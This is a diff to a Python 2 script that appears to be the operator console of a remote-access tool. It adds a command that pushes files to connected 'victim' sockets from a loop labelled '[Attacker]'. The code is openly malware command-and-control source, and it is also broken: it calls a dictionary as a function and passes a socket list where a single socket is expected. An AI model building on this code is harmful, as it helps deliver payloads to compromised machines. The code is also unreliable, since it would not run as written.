@@ -19,15 +19,20 @@ open_client_sockets = []
 messages_to_send = []
 action_message = []
 
-def send_file():
-    pass
 
-def update_version(socket, file_path):
-    pass
+def update_version(socket, command_message):
+    list_arg = command_message.split(';')
+    socket.send(list_arg[0])
+    with open(list_arg[1], 'rb') as file_to_send:
+        bytes_to_send = file_to_send.read(SOCKET_RECV_BYTES)
+        while bytes_to_send:
+            socket.send(bytes_to_send)
+            print('Sent ', repr(bytes_to_send))
+            bytes_to_send = file_to_send.read(SOCKET_RECV_BYTES)
 
 
 command_dict = {
-    4: send_file()
+    4: update_version
 }
 
 
@@ -45,15 +50,22 @@ def decryption(message):
     return message
 
 
+def get_command_id(my_string_msg):
+    return int(my_string_msg.split(';')[0])
+
+
 def handle_attacker_command(victim_list):
     if msvcrt.kbhit():  # if the client typed character
         char = msvcrt.getch()  # get this character
         if chr(KEY_ENTER) is char:  # if enter
-            my_string_msg = ''.join(action_message)
-            print '[Attacker]', my_string_msg
-
-            for wsocket in victim_list:
-                wsocket.send('[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message))
+            command_message = ''.join(action_message)
+            print '[Attacker]', command_message
+            command_id = get_command_id(command_message)
+            if command_id in command_dict:
+                command_dict(victim_list, command_message)
+            else:
+                for wsocket in victim_list:
+                    wsocket.send('[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message))
 
             del action_message[:]  # clean array
 
